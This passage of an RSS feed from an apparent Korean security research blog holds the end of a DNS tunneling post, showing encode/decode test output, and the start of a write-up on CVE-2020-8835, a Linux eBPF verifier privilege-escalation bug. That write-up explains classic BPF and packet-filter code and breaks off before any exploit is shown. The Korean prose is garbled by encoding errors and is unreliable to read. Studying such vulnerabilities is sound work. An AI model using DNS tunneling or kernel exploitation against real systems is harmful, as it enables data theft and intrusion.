&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Seed&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;70953&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Org&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;21822&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;34920&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;34920&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;21822&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Compare&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê²°ê³¼ íŒŒì¼(result.dat)ì€ Dnsbinì—ì„œ ì¶œë ¥ëœ í…ìŠ¤íŠ¸ë¥¼ ì €ì¥í•œ íŒŒì¼ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì „ì†¡ëœ ë°ì´í„°ê°€ ì •ìƒì ìœ¼ë¡œ ë³µí˜¸í™”ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ì°¸ì¡°&quot;&gt;ì°¸ì¡°&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ë„ë©”ì¸ ì´ë¦„ ê·œì¹™(&lt;a href=&quot;https://www.joinc.co.kr/w/man/12/DNS&quot;&gt;https://www.joinc.co.kr/w/man/12/DNS&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-05-01/DNS-Tunneling</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-01/DNS-Tunneling</guid>
        
        <category>research</category>
        
        <category>network</category>
        
        
      </item>
    
      <item>
        <title>CVE-2020-8835</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì¡°ì§„í˜¸&lt;/p&gt;

&lt;h2 id=&quot;sumary&quot;&gt;sumary&lt;/h2&gt;

&lt;p&gt;ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì˜ eBPFì—ì„œ LPEê°€ ë°œìƒí•œë‹¤. ì´ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel/bpf/verifier.c&lt;/code&gt;ì—ì„œ ê²€ì¦í•˜ëŠ” ê³¼ì •ì—ì„œ ë°œìƒí•œë‹¤. CVE-2020-8835ëŠ” &lt;strong&gt;pwn2own 2020&lt;/strong&gt;ì—ì„œ &lt;strong&gt;$30,000&lt;/strong&gt;ë¥¼ ë°›ì€ ë¦¬ëˆ…ìŠ¤ LPEì·¨ì•½ì ì´ë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;bpf&quot;&gt;BPF&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;berckly packet filter.&lt;/strong&gt; íŒ¨í‚·ì— ê²ƒëŠ” í•„í„°ë§. eBPFê°€ ì•„ë‹Œ BPFëŠ” ê°„ë‹¨í•œ êµ¬ì¡°ë¡œ ë˜ì–´ìˆë‹¤. eBPFì™€ êµ¬ë¶„í•˜ê¸° ìœ„í•´ ê·¸ëƒ¥ BPFëŠ” classic BPFë¡œ cBPFë¡œ ë¶€ë¥¸ë‹¤. ë‘ê°œì˜ ë ˆì§€ìŠ¤í„°ë§Œ ê°€ì§€ê³  ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock_filter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Filter block */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;__u16&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;cm&quot;&gt;/* Actual filter code */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;__u8&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Jump true */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;__u8&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Jump false */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;__u32&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* Generic multiuse field */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;këŠ” ì—¬ëŸ¬ê°€ì§€ ìš©ë„ë¡œ ì‚¬ìš©ë˜ëŠ” ë³€ìˆ˜ì´ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;ì¼ë•Œ ë›°ëŠ” ì˜¤í”„ì…‹ì¸ &lt;code class=&quot;highlighter-rouge&quot;&gt;jt&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;ì¼ë•Œ ë›°ëŠ” ì˜¤í”„ì…‹ì¸ &lt;code class=&quot;highlighter-rouge&quot;&gt;jf&lt;/code&gt;ê°€ ìˆë‹¤. ì‹¤ì œ ì‚¬ìš©ì€ ì´ëŸ° ì‹ìœ¼ë¡œ ì‚¬ìš©ëœë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;linux/if_ether.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* From the example above: tcpdump -i em1 port 22 -dd */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock_filter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000c&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000086dd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000014&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000084&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000006&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000011&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000036&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000016&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000038&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000016&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000017&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000084&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000006&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000011&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000014&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00001fff&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000016&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000010&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000016&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000ffff&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock_fprog&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ARRAY_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PF_PACKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_RAW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ETH_P_ALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* ... bail out ... */&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SO_ATTACH_FILTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* ... bail out ... */&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;seccomp&lt;/code&gt;ê±¸ë¦° ë°”ì´ë„ˆë¦¬ë¥¼ ìì£¼ ë´¤ë‹¤ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;seccomp&lt;/code&gt;ì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt;í•„í„°ë§ ì£¼ëŠ” ë°©ì‹ê³¼ ë˜‘ê°™ì€ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. tcpdumpë¥¼ ì´ìš©í•˜ë©´ ì–´ë–¤ì œì•½ì¡°ê±´ì„ ì–´ë–»ê²Œ ê²€ì‚¬í•˜ëŠ”ì§€, ì½”ë“œë“¤ì„ ìì„¸íˆ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;ì„&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Workspace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; 
